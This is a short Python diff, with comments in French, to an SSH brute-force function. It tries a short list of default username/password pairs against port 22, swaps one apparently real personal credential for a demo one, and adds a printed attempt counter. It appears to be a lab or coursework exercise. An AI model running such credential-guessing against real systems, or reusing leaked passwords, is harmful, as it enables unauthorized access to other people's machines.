@@ -49,10 +49,14 @@ def main_bruteforce():
     port = 22
 
     # Tentatives d'authentification
-    credentials = [("admin", "admin"), ("admin", "root"), ("root", "admin"), ("jb","B@aptiste1911!")]
-
+    credentials = [("admin", "admin"), ("admin", "root"), ("root", "admin"), ("demo","sdv92")]
+    tentative = 0
+    print(tentative)
     for username, password in credentials:
+        tentative = 0
         if brute_force_ssh(hostname, port, username, password):
             # Si l'authentification réussit, sortir de la boucle
+            tentative = 1 
+            print(tentative)
             break
 
